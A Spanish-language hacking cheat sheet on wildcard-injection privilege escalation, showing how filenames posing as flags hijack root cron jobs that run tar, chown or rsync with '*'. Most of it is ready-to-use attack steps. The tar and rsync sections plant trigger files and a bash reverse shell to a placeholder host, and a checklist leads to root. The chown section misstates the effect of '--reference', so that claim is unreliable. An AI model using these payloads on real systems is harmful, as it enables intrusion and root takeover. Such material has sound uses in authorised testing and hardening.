# Wildcard Injection

## ¿Qué es?

Cuando un comando usa `*` el sistema lo expande antes de ejecutar. Si puedes crear archivos cuyos nombres parecen flags del comando, el sistema los interpreta como tal.

```bash
# El sistema ve
tar -czf backup.tar.gz *

# Lo expande a
tar -czf backup.tar.gz archivo.txt --checkpoint=1 --checkpoint-action=exec=bash shell.sh
```

tar no sabe que `--checkpoint=1` es un nombre de archivo — lo trata como flag real.

---

## Cómo detectarlo

```bash
# En crontab o pspy ves algo así
* * * * * root cd /var/backup && tar -czf backup.tar.gz *

# Compruebas que puedes escribir en ese directorio
ls -la /var/backup
```

Si puedes escribir en el directorio donde se ejecuta el `*` — explotable.

---

## Binarios vulnerables

```
tar    → --checkpoint-action=exec
rsync  → -e flag
chown  → --reference
chmod  → --reference
find   → -exec
```

---

## Explotación con tar — el más común

```bash
# En el directorio que procesa tar
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=bash shell.sh"

# El payload
echo 'bash -i >& /dev/tcp/TU_IP/4444 0>&1' > shell.sh
chmod +x shell.sh

# Esperas el cron → root
```

---

## Explotación con chown

Si el cron ejecuta `chown root:root *` en un directorio escribible:

```bash
# Creas archivo trampa que referencia /etc/passwd
touch -- "--reference=/etc/passwd"

# chown cambia el propietario de /etc/passwd
```

---

## Explotación con rsync

Si el cron ejecuta `rsync * destino/`:

```bash
echo "" > "-e sh shell.sh"
echo 'bash -i >& /dev/tcp/TU_IP/4444 0>&1' > shell.sh
chmod +x shell.sh
```

---

## Flujo completo

```
1. pspy / crontab   → ves comando con * ejecutado por root
2. ls -la           → confirmas que puedes escribir en ese dir
3. Identificas      → tar / chown / rsync / chmod
4. Creas archivos   → nombres = flags del binario
5. Creas shell.sh   → reverse shell
6. Esperas cron     → root
```

---

## Resumen mental

```
* en comando de root  → posible wildcard injection
Puedes escribir ahí   → explotable
Archivos = flags      → binario los interpreta como opciones
Resultado             → root
```

## Referencias
- https://book.hacktricks.xyz/linux-hardening/privilege-escalation#wildcards
- https://www.exploit-db.com/papers/33930
